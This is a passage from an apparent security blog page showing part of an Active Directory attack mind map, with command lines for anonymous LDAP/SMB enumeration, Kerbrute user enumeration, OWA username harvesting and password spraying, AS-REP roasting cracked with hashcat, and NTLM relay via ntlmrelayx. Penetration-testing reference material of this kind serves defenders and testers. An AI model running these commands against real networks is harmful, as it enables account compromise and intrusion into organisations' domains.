w0Tx/generate-ad-username</span><br><span class="line">    │       └── urbanadventurer/username-anarchy</span><br><span class="line">    ├── User Enumeration</span><br><span class="line">    │   ├── Anonymous SMB/LDAP Enumeration</span><br><span class="line">    │   │   ├── enum4linux -a -u <span class="string">&quot;&quot;</span> -p <span class="string">&quot;&quot;</span> &lt;DC IP&gt;</span><br><span class="line">    │   │   └── ldapsearch -h &lt;DC IP&gt; -x -b <span class="string">&quot;&quot;</span> -s base <span class="string">&quot;(objectclass=*)&quot;</span> namingContexts</span><br><span class="line">    │   ├── Kerbrute Enumeration</span><br><span class="line">    │   │   └── ./kerbrute_linux_amd64 userenum -d domain.com --dc &lt;DC IP&gt; usernames.txt</span><br><span class="line">    │   ├── OWA Server Enumeration</span><br><span class="line">    │   │   └── MailSniper</span><br><span class="line">    │   │       ├── Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt</span><br><span class="line">    │   │       └── Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021</span><br><span class="line">    │   └── Password Spraying</span><br><span class="line">    │       └── Invoke-PasswordSpray -UserList users.txt -Password Summer2021</span><br><span class="line">    ├── Knowing Usernames</span><br><span class="line">    │   ├── ASREPRoast</span><br><span class="line">    │   │   ├── Get-ASReproastHash -Verbose -OutputFormat hashcat</span><br><span class="line">    │   │   └── hashcat -m 18200 hash.txt rockyou.txt</span><br><span class="line">    │   └── Password Spraying</span><br><span class="line">    │       └── Invoke-PasswordSpray -UserList users.txt -Password Summer2021</span><br><span class="line">    └── LLMNR/NBT-NS Poisoning</span><br><span class="line">        └── NTLM Relay</span><br><span class="line">            ├── ntlmrelayx.py -t &lt;target&gt; -c &lt;payload&gt; -smb2support</span><br><span class="line">            └── ntlmrelayx.py -tf targets.txt -c &lt;payload&gt; -smb2support</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/4/">« Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/6/">Next »</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2025 Noflag
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>